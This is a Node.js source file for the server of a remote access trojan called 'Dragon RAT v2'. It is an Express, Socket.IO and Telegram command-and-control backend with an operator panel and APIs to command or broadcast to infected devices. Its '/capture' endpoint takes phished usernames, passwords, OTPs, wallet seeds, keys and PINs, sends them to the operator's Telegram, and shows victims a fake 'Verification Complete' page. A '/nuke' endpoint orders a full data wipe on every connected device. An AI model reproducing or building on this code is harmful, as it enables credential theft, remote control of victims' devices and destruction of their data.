// index.js — Dragon RAT v2
// Express + Socket.IO + Telegram Bot + Panel Serving

require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const session = require('express-session');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 1e8,
    pingInterval: 25000,
    pingTimeout: 30000,
    cors: { origin: '*', methods: ['GET', 'POST'] }
});

const PORT = process.env.PORT || 10000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID ? parseInt(process.env.ADMIN_ID) : null;
const NUKE_KEY = process.env.NUKE_KEY || 'dragondestroy';
const PANEL_USER = process.env.PANEL_USERNAME || 'admin';
const PANEL_PASS = process.env.PANEL_PASSWORD || 'admin';
const SESSION_SECRET = process.env.SESSION_SECRET || 'dragon-rat-v2-secret-key';

// ── Globals ──
global.io = io;
global.devices = new Map();
global.activeDevice = null;
global.waitingForInput = new Map();

// ── Telegram Bot ──
if (!BOT_TOKEN) {
    console.error('[!] BOT_TOKEN not set in .env');
    process.exit(1);
}
if (!ADMIN_ID) {
    console.error('[!] ADMIN_ID not set in .env');
    process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
global.bot = bot;
global.ADMIN_ID = ADMIN_ID;

bot.on('polling_error', (err) => {
    console.error('[!] Bot polling error:', err.message);
});

// ── Middleware ──
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

// Serve static files
app.use(express.static(path.join(__dirname, 'panel')));
app.use('/public', express.static(path.join(__dirname, 'public')));

// ── Auth Middleware ──
function requireAuth(req, res, next) {
    const publicPaths = ['/login', '/api/login', '/health', '/capture'];
    if (publicPaths.includes(req.path)) return next();
    if (req.session && req.session.authenticated) return next();
    if (req.path.startsWith('/public/')) return next();
    if (req.path === '/' && req.session && req.session.authenticated) {
        return res.sendFile(path.join(__dirname, 'panel', 'index.html'));
    }
    if (req.path === '/') {
        return res.redirect('/login');
    }
    res.redirect('/login');
}
app.use(requireAuth);

// ── Routes ──

// Login page
app.get('/login', (req, res) => {
    if (req.session && req.session.authenticated) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'panel', 'login.html'));
});

// Login API
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === PANEL_USER && password === PANEL_PASS) {
        req.session.authenticated = true;
        return res.json({ success: true });
    }
    res.json({ success: false, message: 'Invalid credentials' });
});

// Logout
app.get('/api/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        uptime: Math.floor(process.uptime()),
        devices: global.devices.size,
        activeDevice: global.activeDevice ? 
            (global.devices.get(global.activeDevice)?.info?.id || null) : null
    });
});

// Device list API
app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [socketId, device] of global.devices) {
        deviceList.push({
            socketId,
            info: device.info || null,
            isActive: global.activeDevice === socketId,
            lastSeen: device.lastSeen
        });
    }
    res.json({ devices: deviceList, activeDevice: global.activeDevice });
});

// Send command API
app.post('/api/command', (req, res) => {
    const { socketId, action, params } = req.body;
    const target = socketId || global.activeDevice;
    if (!target) {
        return res.json({ success: false, message: 'No device selected' });
    }
    const sent = global.sendCommand(target, { type: action, ...params });
    res.json({ success: sent, socketId: target });
});

// Broadcast command API
app.post('/api/broadcast', (req, res) => {
    const { action, params } = req.body;
    const count = global.broadcastCommand({ type: action, ...params });
    res.json({ success: true, count });
});

// ── Capture Endpoint ──
app.all('/capture', (req, res) => {
    const data = req.method === 'POST' ? req.body : req.query;
    const { template, username, password, otp, email, seed, key, pin } = data;

    const captureMsg = [
        `🔴 *Credential Captured*`,
        ``,
        `📋 Template: ${template || 'Unknown'}`,
        data.username ? `👤 Username: \`${data.username}\`` : '',
        data.password ? `🔑 Password: \`${data.password}\`` : '',
        data.otp ? `📱 OTP: \`${data.otp}\`` : '',
        data.email ? `📧 Email: \`${data.email}\`` : '',
        data.seed ? `🌱 Seed: \`${data.seed}\`` : '',
        data.key ? `🗝️ Key: \`${data.key}\`` : '',
        data.pin ? `🔢 PIN: \`${data.pin}\`` : '',
        data.timestamp ? `⏰ ${new Date(parseInt(data.timestamp)).toISOString()}` : '',
        ``,
        `🌐 IP: ${req.ip || req.connection?.remoteAddress || 'Unknown'}`,
        `🕒 ${new Date().toISOString()}`
    ].filter(Boolean).join('\n');

    try {
        bot.sendMessage(ADMIN_ID, captureMsg, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error('[!] Capture send failed:', e.message);
    }

    // Return styled verification page
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Verifying...</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: #f5f5f5;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }
                .card {
                    background: white;
                    border-radius: 16px;
                    padding: 40px;
                    text-align: center;
                    box-shadow: 0 4px 24px rgba(0,0,0,0.1);
                    max-width: 400px;
                    width: 90%;
                }
                .check { 
                    width: 64px; 
                    height: 64px; 
                    background: #4caf50; 
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    margin: 0 auto 20px;
                    color: white;
                    font-size: 32px;
                }
                h2 { color: #333; margin-bottom: 8px; }
                p { color: #888; font-size: 0.9rem; margin-bottom: 24px; }
                .spinner {
                    width: 24px; height: 24px;
                    border: 3px solid #e0e0e0;
                    border-top-color: #4caf50;
                    border-radius: 50%;
                    animation: spin 0.8s linear infinite;
                    margin: 0 auto;
                }
                @keyframes spin { to { transform: rotate(360deg); } }
                .redirect-text { color: #aaa; font-size: 0.8rem; margin-top: 16px; }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="check">✓</div>
                <h2>Verification Complete</h2>
                <p>Your identity has been verified successfully.</p>
                <div class="spinner"></div>
                <div class="redirect-text">Redirecting to secure page...</div>
            </div>
            <script>
                setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
            </script>
        </body>
        </html>
    `);
});

// ── Nuke Endpoint ──
app.post('/nuke', (req, res) => {
    const key = req.headers['x-nuke-key'] || req.query.key || '';
    if (key !== NUKE_KEY) {
        return res.status(403).json({ success: false, message: 'Invalid nuke key' });
    }

    const count = global.broadcastCommand({ type: 'destroy', action: 'full_wipe' });

    // Clear all devices
    global.devices.clear();
    global.activeDevice = null;

    if (req.accepts('html')) {
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>NUKE INITIATED</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body {
                        font-family: monospace;
                        background: #0a0a0a;
                        color: #ff4444;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                    }
                    .container { text-align: center; }
                    h1 { font-size: 4rem; letter-spacing: 8px; animation: pulse 1s ease-in-out infinite; }
                    p { color: #888; margin-top: 20px; }
                    .count { font-size: 2rem; color: #ff6644; margin-top: 10px; }
                    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>☠ NUKE ☠</h1>
                    <p>Destroy command sent to:</p>
                    <div class="count">${count} device(s)</div>
                    <p style="margin-top: 30px; color: #555;">All data has been wiped.</p>
                </div>
            </body>
            </html>
        `);
    } else {
        res.json({ success: true, devicesNuked: count });
    }
});

// GET fallback for nuke
app.get('/nuke', (req, res) => {
    const key = req.query.key || '';
    if (key !== NUKE_KEY) {
        return res.status(403).json({ success: false, message: 'Invalid nuke key. Use ?key=your_nuke_key' });
    }
    // Forward to POST handler logic
    const count = global.broadcastCommand({ type: 'destroy', action: 'full_wipe' });
    global.devices.clear();
    global.activeDevice = null;
    res.json({ success: true, devicesNuked: count });
});

// ── Socket Handler ──
const { setupSocketHandlers } = require('./socket_handler.js');
setupSocketHandlers(io);

// ── Bot Commands ──
const { setupBotCommands } = require('./bot_commands.js');
setupBotCommands();

// ── Start Server ──
server.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] Dragon RAT v2 running on port ${PORT}`);
    console.log(`[+] Panel: http://0.0.0.0:${PORT}`);
    console.log(`[+] Bot: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`[+] Admin ID: ${ADMIN_ID}`);
});
